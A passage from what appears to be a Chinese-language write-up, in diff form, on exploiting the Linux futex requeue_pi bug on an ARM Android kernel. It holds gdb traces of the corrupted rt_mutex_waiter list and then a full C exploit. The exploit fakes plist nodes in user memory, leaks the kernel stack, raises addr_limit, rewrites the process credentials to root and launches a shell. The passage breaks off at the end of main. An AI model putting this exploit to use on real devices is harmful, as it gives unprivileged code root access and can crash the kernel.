+munmap(addr1, 0x110000);
+munmap(addr2, 0x110000);
+return 0;
+}
+3. 接下来该关注整个流程中的plist链表操作，并进行实际调试了
+结合前面梳理的触发路径，以及对源代码的阅读，选择合适的断点的位置，以下是具体的调试记录供参考：
+先在futex_wait_requeue_pi断点：
+gdb> b futex_wait_requeue_pi
+运行后触发断点，单步走到：
+struct rt_mutex_waiter rt_waiter;
+q.rt_waiter = &rt_waiter; # 这里将栈上的rt_waiter地址保存在q.rt_waiter
+查看下栈上的rt_waiter地址
+(gdb) p q.rt_waiter 
+$2 = (struct rt_mutex_waiter *) 0xc13b3e10
+
+再在如下函数和位置断点，调试接下来的流程，
+(gdb) b kernel/futex.c:2338 # futex_wait_requeue_pi中futex_wait_queue_me的下一行断点，当线程2被刚被唤醒时触发
+(gdb) b futex_requeue
+(gdb) b futex_lock_pi
+
+继续运行，首先在futex_requeue上触发了断点，这是第一次调用FUTEX_CMP_REQUEUE_PI触发：
+syscall(__NR_futex, &lock1, FUTEX_CMP_REQUEUE_PI, 1, 0, &lock2, lock1);
+(在这次调用里lock2锁获取失败，lock1上的waiter_list将移到lock2)
+
+单步调试走到task_blocks_on_rt_mutex中：
+(gdb) 
+961 ret = task_blocks_on_rt_mutex(lock, waiter, task, detect_deadlock);
+(gdb) s
+task_blocks_on_rt_mutex (lock=0xc13d56c8, waiter=0xc13b3e10, task=0xc40bb800, detect_deadlock=1) at kernel/rtmutex.c:396
+396 struct task_struct *owner = rt_mutex_owner(lock);
+(gdb) bt
+#0 task_blocks_on_rt_mutex (lock=0xc13d56c8, waiter=0xc13b3e10, task=0xc40bb800, detect_deadlock=1) at kernel/rtmutex.c:401
+#1 0xc00529a8 in rt_mutex_start_proxy_lock (lock=0xc13d56c8, waiter=0xc13b3e10, task=0xc40bb800, detect_deadlock=1) at kernel/rtmutex.c:961
+#2 0xc00508c0 in futex_requeue (uaddr1=0xc4abf0cc, flags=1, uaddr2=<optimized out>, nr_wake=0, nr_requeue=0, cmpval=0xc13c7f68, requeue_pi=1) at kernel/futex.c:1439
+#3 0xc0051f10 in do_futex (uaddr=0xaec0b008, op=<optimized out>, val=1, timeout=<optimized out>, uaddr2=0xaec0b00c, val2=0, val3=0) at kernel/futex.c:2693
+#4 0xc005207c in sys_futex (uaddr=0xaec0b008, op=12, val=1, utime=<optimized out>, uaddr2=0xaec0b00c, val3=0) at kernel/futex.c:2729
+#5 0xc000d680 in ?? ()
+(gdb) p *waiter
+$5 = {list_entry = {prio = 0, prio_list = {next = 0xc003920c, prev = 0x0}, node_list = {next = 0x2, prev = 0xc13b3e44}}, pi_list_entry = {prio = -1073484320, prio_list = {next = 0xc13b2000, 
+      prev = 0xc40b16c0}, node_list = {next = 0xc40bb800, prev = 0xc0489028}}, task = 0x0, lock = 0xc40b16c0}
+
+注意到此时的参数waiter=0xc4905e10刚好是前面栈上的waiter，lock则是lock2对应的rt_mutex
+在该函数中，经过plist_add操作，将栈上的waiter加入到了lock->wait_list等待列表中。
+
+接下来会触发2次futex_lock_pi断点，即上面代码中通过create_waiter先创建了两个线程，并创建了两个rt_waiter节点的过程：
+第一次断点如下，单步到task_blocks_on_rt_mutex：
+(gdb) s
+task_blocks_on_rt_mutex (lock=0xc13d56c8, waiter=0xc1347de0, task=0xc4130400, detect_deadlock=1) at kernel/rtmutex.c:396
+396 struct task_struct *owner = rt_mutex_owner(lock);
+(gdb) bt
+#0 task_blocks_on_rt_mutex (lock=0xc13d56c8, waiter=0xc1347de0, task=0xc4130400, detect_deadlock=1) at kernel/rtmutex.c:396
+#1 0xc0366824 in rt_mutex_slowlock (lock=0xc13d56c8, state=1, timeout=0x0, detect_deadlock=1) at kernel/rtmutex.c:645
+#2 0xc0050fec in futex_lock_pi (uaddr=0xaec0b00c, flags=<optimized out>, time=<optimized out>, trylock=0, detect=<optimized out>) at kernel/futex.c:2048
+#3 0xc0051ec0 in do_futex (uaddr=0xaec0b00c, op=<optimized out>, val=1, timeout=<optimized out>, uaddr2=0x0, val2=0, val3=0) at kernel/futex.c:2687
+#4 0xc005207c in sys_futex (uaddr=0xaec0b00c, op=6, val=1, utime=<optimized out>, uaddr2=0x0, val3=0) at kernel/futex.c:2729
+#5 0xc000d680 in ?? ()
+(gdb) p waiter
+$6 = (struct rt_mutex_waiter *) 0xc1347de0
+(gdb) p *waiter
+$7 = {list_entry = {prio = -1053524332, prio_list = {next = 0xc004f738, prev = 0x800002da}, node_list = {next = 0x0, prev = 0x2f9}}, pi_list_entry = {prio = -1363103732, prio_list = {next = 0xc04c3c58, 
+      prev = 0xc004f9fc}, node_list = {next = 0xaec0b00c, prev = 0x800002da}}, task = 0xc1347e94, lock = 0x0}
+
+继续运行，触发第二次futex_lock_pi断点，单步执行：
+(gdb) s
+task_blocks_on_rt_mutex (lock=0xc13d56c8, waiter=0xc1353de0, task=0xc30a6400, detect_deadlock=1) at kernel/rtmutex.c:396
+396 struct task_struct *owner = rt_mutex_owner(lock);
+(gdb) p waiter
+$6 = (struct rt_mutex_waiter *) 0xc1353de0
+
+
+继续运行，触发了第二次futex_requeue，用于唤醒等待线程。
+在继续调试前，先看看当前rt_watier的链表状态，依次查看前面出现的三个栈上的rt_watier：
+
+(gdb) p *(struct rt_mutex_waiter *)0xc13b3e10
+$13 = {list_entry = {prio = 132, prio_list = {next = 0xc1347de4, prev = 0xc1353de4}, node_list = {next = 0xc13d56c8, prev = 0xc1353dec}}, pi_list_entry = {prio = 132, prio_list = {next = 0xc13b3e28, 
+      prev = 0xc13b3e28}, node_list = {next = 0xc13b3e30, prev = 0xc13b3e30}}, task = 0xc40bb800, lock = 0xc13d56c8}
+
+(gdb) p *(struct rt_mutex_waiter *)0xc1347de0
+$12 = {list_entry = {prio = 123, prio_list = {next = 0xc1353de4, prev = 0xc13b3e14}, node_list = {next = 0xc1353dec, prev = 0xc13d56c8}}, pi_list_entry = {prio = 123, prio_list = {next = 0xc1347df8, 
+      prev = 0xc1347df8}, node_list = {next = 0xc4130f70, prev = 0xc4130f70}}, task = 0xc4130400, lock = 0xc13d56c8}
+
+(gdb) p *(struct rt_mutex_waiter *)0xc1353de0
+$11 = {list_entry = {prio = 127, prio_list = {next = 0xc13b3e14, prev = 0xc1347de4}, node_list = {next = 0xc13b3e1c, prev = 0xc1347dec}}, pi_list_entry = {prio = 127, prio_list = {next = 0xc1353df8, 
+      prev = 0xc1353df8}, node_list = {next = 0xc1353e00, prev = 0xc1353e00}}, task = 0xc30a6400, lock = 0xc13d56c8}
+
+可以看到3个节点形成一条rt_waiter的链表
+
+接下来触发线程1被唤醒的断点：
+Breakpoint 2, futex_wait_requeue_pi (uaddr=0xaec0b008, flags=1, val=0, abs_time=<optimized out>, bitset=4294967295, uaddr2=0xaec0b00c) at kernel/futex.c:2339
+2339 ret = handle_early_requeue_pi_wakeup(hb, &q, &key2, to);
+(gdb) p q->rt_waiter
+$17 = (struct rt_mutex_waiter *) 0x0
+此时的q->rt_waiter已被清零
+
+查看下栈上的rt_waiter，还是正常:
+(gdb) p *(struct rt_mutex_waiter *)0xc13b3e10
+$18 = {list_entry = {prio = 132, prio_list = {next = 0xc1347de4, prev = 0xc1353de4}, node_list = {next = 0xc13d56c8, prev = 0xc1353dec}}, pi_list_entry = {prio = 132, prio_list = {next = 0xc13b3e28, 
+      prev = 0xc13b3e28}, node_list = {next = 0xc13b3e30, prev = 0xc13b3e30}}, task = 0xc40bb800, lock = 0xc13d56c8}
+
+接下来触发futex_lock_pi，用于创建一个新节点进行链表插入操作
+Breakpoint 4, futex_lock_pi (uaddr=0xaec0b00c, flags=1, time=0x0, trylock=0, detect=<optimized out>) at kernel/futex.c:1988
+1988 static int futex_lock_pi(u32 __user *uaddr, unsigned int flags, int detect,
+(gdb) bt
+#0 task_blocks_on_rt_mutex (lock=0xc13d56c8, waiter=0xc1329de0, task=0xc30a6000, detect_deadlock=1) at kernel/rtmutex.c:396
+#1 0xc0366824 in rt_mutex_slowlock (lock=0xc13d56c8, state=1, timeout=0x0, detect_deadlock=1) at kernel/rtmutex.c:645
+#2 0xc0050fec in futex_lock_pi (uaddr=0xaec0b00c, flags=<optimized out>, time=<optimized out>, trylock=0, detect=<optimized out>) at kernel/futex.c:2048
+#3 0xc0051ec0 in do_futex (uaddr=0xaec0b00c, op=<optimized out>, val=1, timeout=<optimized out>, uaddr2=0x0, val2=0, val3=0) at kernel/futex.c:2687
+#4 0xc005207c in sys_futex (uaddr=0xaec0b00c, op=6, val=1, utime=<optimized out>, uaddr2=0x0, val3=0) at kernel/futex.c:2729
+#5 0xc000d680 in ?? ()
+
+此时先查看栈上的rt_mutex_waiter，发现已被覆写为构造数据
+(gdb) p *(struct rt_mutex_waiter *)0xc13b3e10
+$19 = {list_entry = {prio = 1114112, prio_list = {next = 0x80, prev = 0x110000}, node_list = {next = 0x80, prev = 0x110000}}, pi_list_entry = {prio = 128, prio_list = {next = 0x110000, prev = 0x80}, 
+    node_list = {next = 0x110000, prev = 0x110000}}, task = 0x110000, lock = 0x110000}
+
+
+但此时的prio_list.next = 0x80, prio_list.prev = 0x110000，和我们预想的有偏差，预想的是next和prev都指向我们用户态mmap的可控内存，因此这里需要微调栈布局修正。
+在调整之前，先继续调试一下，熟悉一下链表操作过程。
+单步进入plist_add，会首先遍历链表。链表是按优先级从小到大遍历的，会比较新节点和已有节点的优先级，直到找到比当前节点大的节点。
+所以依次遍历了两个正常节点(prio=123和prio=127)后，找到了被覆写的节点(这里是prio=1114112)，然后调用list_add_tail:
+
+(gdb) 
+101 list_add_tail(&node->prio_list, &iter->prio_list);
+(gdb) s
+list_add_tail (head=0xc45b9e14, new=0xc3329de4) at include/linux/list.h:76
+76 __list_add(new, head->prev, head);
+(gdb) s
+__list_add (next=0xc45b9e14, prev=0x110000, new=0xc3329de4) at include/linux/list.h:41
+41 next->prev = new;
+(gdb) p *next
+$34 = {next = 0x80, prev = 0x110000}
+(gdb) p next->prev
+$32 = (struct list_head *) 0x110000
+(gdb) ptype struct list_head
+type = struct list_head {
+    struct list_head *next;
+    struct list_head *prev;
+}
+(gdb) l
+36 #ifndef CONFIG_DEBUG_LIST
+37 static inline void __list_add(struct list_head *new,
+38 struct list_head *prev,
+39 struct list_head *next)
+40 {
+41 next->prev = new;
+42 new->next = next;
+43 new->prev = prev;
+44 prev->next = new;
+45 }
+(gdb) x/5i $pc
+=> 0xc01d05a4 <plist_add+172>: str r6, [r2, #8]
+   0xc01d05a8 <plist_add+176>: add r2, r2, #4
+   0xc01d05ac <plist_add+180>: stmib r4, {r2, r3}
+   0xc01d05b0 <plist_add+184>: str r6, [r3]
+   0xc01d05b4 <plist_add+188>: ldr r3, [r5, #4]
+(gdb) i r
+r0 0x85 133
+r1 0xc3121de0 -1022222880
+r2 0xc45b9e10 -1000628720
+r3 0x110000 1114112
+r4 0xc3329de0 -1020092960
+r5 0xc45b9e1c -1000628708
+r6 0xc3329de4 -1020092956
+r7 0xc35e0288 -1017249144
+
+第一次调试到这里就结束了。现在我们控制了一个内核链表节点，可以让其指向用户空间，结合链表操作，我们有了读写内核内存的机会。
+
+4. 调整exploit，控制内核读写
+经过上一步的调试，参考已有的exp，构造思路如下:
+在覆写rt_waiter节点之前，内核链表如下：
+|3|<->|7|<->|12|
+节点上的数字代表优先级(在内核里会被加上120，即优先级为3的，内核里对应的prio就为123)
+现在我们覆写了优先级为12的节点，使其优先级为-1，并指向用户空间节点。
+这里定为-1是因为首先插入操作要插在比自己大的节点前，而我们能控制的节点位于覆写节点的后面，为了能让新节点能插入到可控的用户态节点之间，需要该节点优先级比较小，至少要小于新节点的优先级，结合已有exp，将该节点设为-1满足需求。
+覆写目标节点后，并在用户态内存上也构造两个节点，形成链表如下：
+|3|<->|7|<->|-1|<->|13|<->|17|
+其中3,7为正常内核节点,-1为被覆写的内核节点，13和17为用户态伪造节点。这样如果创建进行的线程，并将优先级设为15，将能把相应的内核节点插入到13和17节点之间，由此我们就能有能力读写内核。看下节点插入操作关键实现：
+    next->prev = new; // 新节点地址写入后向节点prev指针，后向节点位于用户态，于是我们能获取到新节点的地址，这一地址指向内核栈上。
+    new->next = next; // 更新新节点，不重要
+    new->prev = prev; // 更新新节点，不重要
+    prev->next = new; // 新节点地址写入prev指针指向的内存，而prev指针可控，于是我们能在任意地址写入一个值，当然这个值不是任意值，而是一个节点地址
+现在我们有能力读取到内核栈地址，也有能力将一个任意地址改写成一定的值(这个值即当前rt_waiter节点的地址，指向栈上)。
+根据栈地址可以定位到thread_info，进一步能定位到addr_limit地址。因此可以尝试多次修改addr_limit来达到内核任意写的目的。
+
+重新调整代码，调整栈布局来构造链表。重新调试，这次调试不必再从头开始，可以只在关键位置断点，例如，在futex_wait_requeue_pi中futex_wait_queue_me的下一行断点，在线程唤醒时断下，这时候可以打出栈上的rt_waiter，就能进一步查看整个链表
+(gdb) b kernel/futex.c:2338
+(gdb) c
+Breakpoint 1, futex_wait_requeue_pi (uaddr=0xa7a81004, flags=1, val=0, abs_time=<optimized out>, bitset=4294967295, uaddr2=0xa7a81008) at kernel/futex.c:2339
+2339 ret = handle_early_requeue_pi_wakeup(hb, &q, &key2, to);
+(gdb) p &rt_waiter 
+$1 = (struct rt_mutex_waiter *) 0xc4903e10
+(gdb) p *(struct rt_mutex_waiter *) 0xc4903e10
+$2 = {list_entry = {prio = 132, prio_list = {next = 0xc4205de4, prev = 0xc421fde4}, node_list = {next = 0xc41e8748, prev = 0xc421fdec}}, pi_list_entry = {prio = 132, prio_list = {next = 0xc4903e28, 
+      prev = 0xc4903e28}, node_list = {next = 0xc4903e30, prev = 0xc4903e30}}, task = 0xc41ec400, lock = 0xc41e8748}
+(gdb) p *(struct rt_mutex_waiter *) 0xc4205de0
+$3 = {list_entry = {prio = 123, prio_list = {next = 0xc421fde4, prev = 0xc4903e14}, node_list = {next = 0xc421fdec, prev = 0xc41e8748}}, pi_list_entry = {prio = 123, prio_list = {next = 0xc4205df8, 
+      prev = 0xc4205df8}, node_list = {next = 0xc41ecb70, prev = 0xc41ecb70}}, task = 0xc41f8800, lock = 0xc41e8748}
+(gdb) p *(struct rt_mutex_waiter *) 0xc421fde0
+$4 = {list_entry = {prio = 127, prio_list = {next = 0xc4903e14, prev = 0xc4205de4}, node_list = {next = 0xc4903e1c, prev = 0xc4205dec}}, pi_list_entry = {prio = 127, prio_list = {next = 0xc421fdf8, 
+      prev = 0xc421fdf8}, node_list = {next = 0xc421fe00, prev = 0xc421fe00}}, task = 0xc4125c00, lock = 0xc41e8748}
+
+然后futex_lock_pi上断点，此时已经完成链表构造，并即将插入新节点：
+(gdb) b futex_lock_pi
+(gdb) b task_blocks_on_rt_mutex
+(gdb) c
+Breakpoint 2, futex_lock_pi (uaddr=0xa7a81008, flags=1, time=0x0, trylock=0, detect=<optimized out>) at kernel/futex.c:1988
+1988 static int futex_lock_pi(u32 __user *uaddr, unsigned int flags, int detect,
+
+后续就是跟踪task_blocks_on_rt_mutex里plist_add过程，进行内核读写操作泄露内核栈地址，再进一步修改addr_limit。主要是调试工作，细节不再描述。
+
+
+
+最终实现的完整exploit如下：
+不过这个实现没有修复链表，exploit退出时，内核会崩，参考exploit似乎做了修复链表的操作，现在有读写内核的访问能力，应该可以再修复下链表保证正常退出不崩溃的。
+
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include <stdio.h>
+#include <pthread.h>
+#include <arpa/inet.h>
+#include <sys/mman.h>
+#include <sys/resource.h>
+#include <sys/socket.h>
+#include <sys/syscall.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <linux/futex.h>
+#include <unistd.h>
+
+#define PORT 7331
+
+int lock1 = 0, lock2 = 0;
+void *ptr;
+#define THREAD_SIZE 8192
+
+struct list_head {
+unsigned long *next;
+unsigned long *prev;
+};
+
+struct plist_node {
+int prio;
+struct list_head prio_list;
+struct list_head node_list;
+};
+
+struct task_struct;
+
+struct thread_info {
+unsigned long flags; /* low level flags */
+int preempt_count; /* 0 => preemptable, <0 => bug */
+unsigned long addr_limit; /* address limit */
+struct task_struct *task; /* main task structure */
+/*...*/
+};
+
+pid_t eval_tid = 0;
+pid_t eval_tid2 = 0;
+struct thread_info *vul_thread_info;
+struct task_struct *vul_task_struct;
+struct plist_node *fake_node1, *fake_node2;
+
+int connect_server(void)
+{
+int opt;
+int sock;
+struct sockaddr_in addr = {0};
+
+sock = socket(AF_INET, SOCK_STREAM, SOL_TCP);
+if (sock < 0) {
+printf("socket create fail, err=%d\n", errno);
+return -1;
+ }
+addr.sin_family = AF_INET;
+addr.sin_port = htons(PORT);
+addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+
+while (1) {
+if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) >= 0)
+break;
+usleep(10);
+ }
+
+opt = 1;
+setsockopt(sock, SOL_SOCKET, SO_SNDBUF, (char *)&opt, sizeof(opt));
+return sock;
+}
+
+// kernel space read by pipe
+ssize_t read_pipe(void *ksrcbuf, void *udstbuf, size_t count)
+{
+int pipefd[2];
+ssize_t len;
+
+pipe(pipefd);
+len = write(pipefd[1], ksrcbuf, count);
+
+if (len != count) {
+printf("pipe read ksrcbuf=%p,len=%d, err=%d\n", ksrcbuf, len, errno);
+return -1;
+ }
+read(pipefd[0], udstbuf, count);
+close(pipefd[0]);
+close(pipefd[1]);
+return len;
+}
+
+// kernel space write by pipe
+ssize_t write_pipe(void *kdstbuf, void *usrcbuf, size_t count)
+{
+int pipefd[2];
+ssize_t len;
+
+pipe(pipefd);
+len = write(pipefd[1], usrcbuf, count);
+
+if (len != count) {
+printf("pipe read usrcbuf=%p,len=%d, err=%d\n", usrcbuf, len, errno);
+return -1;
+ }
+read(pipefd[0], kdstbuf, count);
+close(pipefd[0]);
+close(pipefd[1]);
+return len;
+}
+
+void hack_kernel(int signum)
+{
+struct thread_info ti;
+unsigned long addr_limit = 0xffffffff;
+
+printf("thread_waiter wakeup, tid=%x, uid=%d, signum=%d\n", gettid(), getuid(), signum);
+printf("vul_thread_info = %p\n", vul_thread_info);
+//printf("target task = %p", vul_thread_info->task);
+read_pipe(vul_thread_info, &ti, sizeof(struct thread_info));
+printf("vul_thread_info->addr_limit=%08lx\n", ti.addr_limit);
+printf("vul_thread_info->task=%p\n",ti.task);
+vul_task_struct = ti.task;
+write_pipe((void *)&vul_thread_info->addr_limit, (void *)&addr_limit, sizeof(addr_limit));
+read_pipe(vul_thread_info, &ti, sizeof(struct thread_info));
+printf("vul_thread_info->addr_limit=%08lx\n", ti.addr_limit);
+
+kill(eval_tid2, 16);
+
+while (1) {
+sleep(100);
+ }
+}
+
+void get_root(int signum)
+{
+int i;
+unsigned long task_dump[0x400];
+unsigned long cred_dump[0x40];
+unsigned long vul_cred = 0;
+
+printf("thread_waiter wakeup, tid=%d, uid=%d, signum=%d\n", gettid(), getuid(), signum);
+printf("vul_task_struct = %p\n", vul_task_struct);
+
+read_pipe(vul_task_struct, task_dump, sizeof(task_dump));
+
+for (i = 0; i < 0x400; i++) {
+if (task_dump[i] == task_dump[i + 1]) {
+if (task_dump[i] > 0xc0000000) {
+if (task_dump[i + 2] == task_dump[i + 3]) {
+if (task_dump[i + 2] > 0xc0000000) {
+if (task_dump[i + 4] == task_dump[i + 5]) {
+if (task_dump[i + 4] > 0xc0000000) {
+if (task_dump[i + 6] == task_dump[i + 7]) {
+if (task_dump[i + 6] > 0xc0000000) {
+vul_cred = task_dump[i + 6];
+break;
+ }
+ }
+ }
+ }
+ }
+ }
+ }
+ }
+ }
+
+if (vul_cred) {
+printf("vul_cred found! vul_cred=%08x\n", vul_cred);
+read_pipe(vul_cred, cred_dump, sizeof(cred_dump));
+
+// Update the cred struct 
+cred_dump[1] = 0; // uid
+cred_dump[2] = 0; // gid
+cred_dump[3] = 0; // suid
+cred_dump[4] = 0; // sgid
+cred_dump[5] = 0; // euid
+cred_dump[6] = 0; // egid
+cred_dump[7] = 0; // fsuid
+cred_dump[8] = 0; // fsgid
+
+cred_dump[10] = 0xffffffff; // cap_inheritable
+cred_dump[11] = 0xffffffff; // cap_permitted
+cred_dump[12] = 0xffffffff; // cap_effective
+cred_dump[13] = 0xffffffff; // cap_bset
+cred_dump[14] = 0xffffffff; // jit_keyring
+cred_dump[15] = 0xffffffff; // *session_keyring
+cred_dump[16] = 0xffffffff; // *process_keyring
+cred_dump[17] = 0xffffffff; // *thread_keyring;
+write_pipe((void *)vul_cred, cred_dump, 0x40);
+
+sleep(2);
+
+printf("uid=%d\n", getuid());
+system("/system/bin/sh");
+ }
+
+while (1) {
+sleep(100);
+ }
+}
+
+static void *thread_waiter(void *arg)
+{
+int ret;
+int prio = (int)arg;
+struct sigaction act;
+
+setpriority(PRIO_PROCESS, 0, prio);
+if (prio == 18) {
+// eval thread
+eval_tid = syscall(__NR_gettid);
+printf("gettid=%d, sys_gettid=%d\n", gettid(), eval_tid);
+
+act.sa_handler = hack_kernel;
+sigemptyset(&act.sa_mask);
+act.sa_flags = 0;
+act.sa_restorer = NULL;
+sigaction(18, &act, NULL);
+ }
+if (prio == 16) {
+// eval thread 2
+eval_tid2 = syscall(__NR_gettid);
+printf("gettid=%d, sys_gettid=%d\n", gettid(), eval_tid2);
+
+act.sa_handler = get_root;
+sigemptyset(&act.sa_mask);
+act.sa_flags = 0;
+act.sa_restorer = NULL;
+sigaction(16, &act, NULL);
+ }
+
+printf("thread_waiter start, tid=%d, prio=%d\n", gettid(), prio);
+ret = syscall(__NR_futex, &lock2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
+printf("thread_waiter wakeup, tid=%d", gettid());
+
+while (1) {
+sleep(100);
+ }
+return NULL;
+}
+
+int create_waiter(int prio)
+{
+pthread_t t;
+
+pthread_create(&t, NULL, thread_waiter, (void *)prio);
+return 0;
+}
+
+static void *thread_func1(void *arg)
+{
+int i;
+int ret;
+unsigned long stack_waiter, new_addr_limit;
+struct thread_info *ti;
+
+printf("thread_func1 start, tid=%d\n", gettid());
+// STEP1
+printf("STEP1: thread1 lock on lock2\n");
+syscall(__NR_futex, &lock2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
+sleep(1);
+// STEP3
+printf("STEP3: thread1 try to requeue thread2 to lock2 (will fail)\n");
+ret = syscall(__NR_futex, &lock1, FUTEX_CMP_REQUEUE_PI, 1, 0, &lock2, lock1);
+printf("ret=%d\n", ret);
+
+// Q&A: why should we add waiter before requeue thread2?
+create_waiter(3); // prio = 123
+create_waiter(7); // prio = 127
+sleep(1);
+
+// STEP4
+printf("STEP4: clean lock1 in userspace\n");
+printf("lock2=0x%08x\n", lock2);
+lock2 = 0;
+
+// STEP5
+printf("STEP5: thread1 try to requeue thread2 from lock2 to lock2 (RELOCK)\n");
+ret = syscall(__NR_futex, &lock2, FUTEX_CMP_REQUEUE_PI, 1, 0, &lock2, lock2);
+printf("ret=%d\n", ret);
+
+sleep(2);
+// create userland node here
+fake_node1->prio = 130;
+fake_node1->prio_list.prev = 0;
+fake_node1->prio_list.next = (unsigned long *)&fake_node2->prio_list;
+fake_node1->node_list.prev = (unsigned long *)(fake_node2 + 0x100);
+fake_node1->node_list.next = (unsigned long *)(fake_node2 + 0x100);
+
+
+fake_node2->prio = 139;
+fake_node2->prio_list.prev = (unsigned long *)&fake_node1->prio_list;
+fake_node2->prio_list.next = 0;
+fake_node2->node_list.prev = (unsigned long *)(fake_node2 + 0x100);
+fake_node2->node_list.next = (unsigned long *)(fake_node2 + 0x100);
+
+ *(unsigned long *)(fake_node2 + 0x100) = 0; // write here to avoid page fault
+
+create_waiter(18); // prio = 138
+sleep(1);
+
+stack_waiter = (unsigned long)fake_node2->prio_list.prev;
+ti = (struct thread_info *)(stack_waiter & ~(THREAD_SIZE - 1));
+printf("leak stack_waiter = 0x%lx\n", stack_waiter);
+printf("thread_info = 0x%lx\n", (unsigned long)ti);
+
+fake_node1->prio = 130;
+fake_node1->prio_list.prev = 0;
+fake_node1->prio_list.next = (unsigned long *)&fake_node2->prio_list;
+fake_node1->node_list.prev = (unsigned long *)(fake_node2 + 0x100);
+fake_node1->node_list.next = (unsigned long *)(fake_node2 + 0x100);
+
+fake_node2->prio = 139;
+fake_node2->prio_list.prev = (unsigned long *)&ti->addr_limit;
+fake_node2->prio_list.next = 0;
+fake_node2->node_list.prev = (unsigned long *)(fake_node2 + 0x100);
+fake_node2->node_list.next = (unsigned long *)(fake_node2 + 0x100);
+
+create_waiter(17); // prio = 137
+sleep(1);
+new_addr_limit = (unsigned long)fake_node2->prio_list.prev;
+printf("new addr_limit = 0x%lx\n", new_addr_limit);
+
+for (i = 0; i < 50; i++) {
+fake_node1->prio = 130;
+fake_node1->prio_list.prev = 0;
+fake_node1->prio_list.next = (unsigned long *)&fake_node2->prio_list;
+fake_node1->node_list.prev = (unsigned long *)(fake_node2 + 0x100);
+fake_node1->node_list.next = (unsigned long *)(fake_node2 + 0x100);
+
+fake_node2->prio = 139;
+fake_node2->prio_list.prev = (unsigned long *)&fake_node1->prio_list;
+fake_node2->prio_list.next = 0;
+fake_node2->node_list.prev = (unsigned long *)(fake_node2 + 0x100);
+fake_node2->node_list.next = (unsigned long *)(fake_node2 + 0x100);
+
+create_waiter(16); // prio = 136
+sleep(1);
+
+stack_waiter = (unsigned long)fake_node2->prio_list.prev;
+ti = (struct thread_info *)(stack_waiter & ~(THREAD_SIZE - 1));
+printf("leak stack_waiter = 0x%lx\n", stack_waiter);
+printf("thread_info = 0x%lx\n", (unsigned long)ti);
+if ((unsigned long)ti < new_addr_limit) {
+printf("vulnerable thread found!!!\n");
+vul_thread_info = ti;
+printf("vul_thread_info=%p\n", vul_thread_info);
+if (eval_tid) {
+printf("eval_tid=%d\n", (int)eval_tid);
+kill(eval_tid, 18);
+ } else {
+printf("eval thread not found, exploit failed\n");
+ }
+break;
+ }
+ }
+
+printf("thread1 goto loop...\n");
+while(1)
+sleep(100);
+return NULL;
+}
+
+static void *thread_func2(void *arg)
+{
+int i, ret;
+int sock;
+struct mmsghdr msgvec[1];
+struct iovec msg_iov[8];
+unsigned long databuf[0x20];
+
+printf("thread_func2 start, tid=%d\n", gettid());
+
+setpriority(PRIO_PROCESS, 0, 12); // prio = 132
+
+for (i = 0; i < 0x20; i++) {
+databuf[i] = (unsigned long)(&fake_node1->prio_list);
+ }
+
+for (i = 0; i <= 8; i++) {
+msg_iov[i].iov_base = &fake_node1->prio_list;
+msg_iov[i].iov_len = 0x80;
+ }
+
+//msg_iov[IOVSTACK_TARGET] will be our new waiter.
+// iov_len must be large enough to fill the socket kernel buffer to avoid the sendmmsg to return.
+
+msg_iov[4].iov_base = (void *)0xffffffff; // prio = -1
+msg_iov[4].iov_len = (unsigned int)(&fake_node1->prio_list); // next
+msg_iov[5].iov_base = 0; // prev
+
+// The new waiter will be something like that:
+// prio = fake_node
+// prio_list->next = fake_node_alt
+// prio_list->prev = fake_node
+// node_list->next = 0x7d
+// node_list->prev = fake_node
+
+// hacked_node will be somethin < 0 so a negative priority
+
+msgvec[0].msg_hdr.msg_name = databuf;
+msgvec[0].msg_hdr.msg_namelen = 0x80;
+msgvec[0].msg_hdr.msg_iov = msg_iov;
+msgvec[0].msg_hdr.msg_iovlen = 8;
+msgvec[0].msg_hdr.msg_control = databuf;
+msgvec[0].msg_hdr.msg_controllen = 0x20;
+msgvec[0].msg_hdr.msg_flags = 0;
+msgvec[0].msg_len = 0;
+
+sock = connect_server();
+if (sock == -1) {
+printf("connect_server() failed\n");
+return NULL;
+ }
+printf("connect_server success\n");
+
+// STEP2
+printf("STEP2: thread2 wait requeue\n");
+syscall(__NR_futex, &lock1, FUTEX_WAIT_REQUEUE_PI, 0, 0, &lock2, 0);
+
+//printf("thread2 awaked by requeue\n");
+
+while(1) {
+ret = syscall(__NR_sendmmsg, sock, msgvec, 1, 0);
+printf("modify stack ret = %d\n", ret);
+ }
+
+printf("thread2 goto loop...\n");
+while (1) {
+sleep(100);
+ }
+
+return NULL;
+}
+
+int main(int argc, char *argv[])
+{
+int opt;
+int sock;
+pthread_t p1, p2;
+struct sockaddr_in addr = {0};
+
+ptr = mmap((void *)0x100000, 0x100000, PROT_READ|PROT_WRITE|PROT_EXEC,
+ MAP_SHARED|MAP_FIXED|MAP_ANONYMOUS, -1, 0);
+if (ptr == MAP_FAILED) {
+printf("mmap failed, err=%d\n", errno);
+return -1;
+ }
+
+fake_node1 = (struct plist_node *)((unsigned long)ptr + 0x10000);
+fake_node2 = (struct plist_node *)((unsigned long)ptr + 0x20000);
+
+printf("addr=%08x fake_node1=%08x, fake_node2=%08x\n",
+ (unsigned int)ptr, (unsigned int)fake_node1, (unsigned int)fake_node2);
+printf("plock1=%p, plock2=%p\n", &lock1, &lock2);
+
+pthread_create(&p1, NULL, thread_func1, NULL);
+pthread_create(&p2, NULL, thread_func2, NULL);
+
+sock = socket(AF_INET, SOCK_STREAM, SOL_TCP);
+if (sock < 0) {
+printf("socket create fail, err=%d\n", errno);
+goto err;
+ }
+opt = 1;
+setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt));
+opt = 1;
+setsockopt(sock, SOL_SOCKET, SO_RCVBUF, (char *)&opt, sizeof(opt));
+
+addr.sin_family = AF_INET;
+addr.sin_port = htons(PORT);
+addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+
+if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+printf("socket bind fail, err=%d\n", errno);
+goto err;
+ }
+
+if (listen(sock, 1) < 0) {
+printf("socket listen fail, err=%d\n", errno);
+goto err;
+ }
+
+while (1) {
+if (accept(sock, NULL, NULL) < 0) {
+printf("socket accept fail, err=%d\n", errno);
+goto err;
+ } else {
+printf("socket accept success!\n");
+ }
+ }
+
+err:
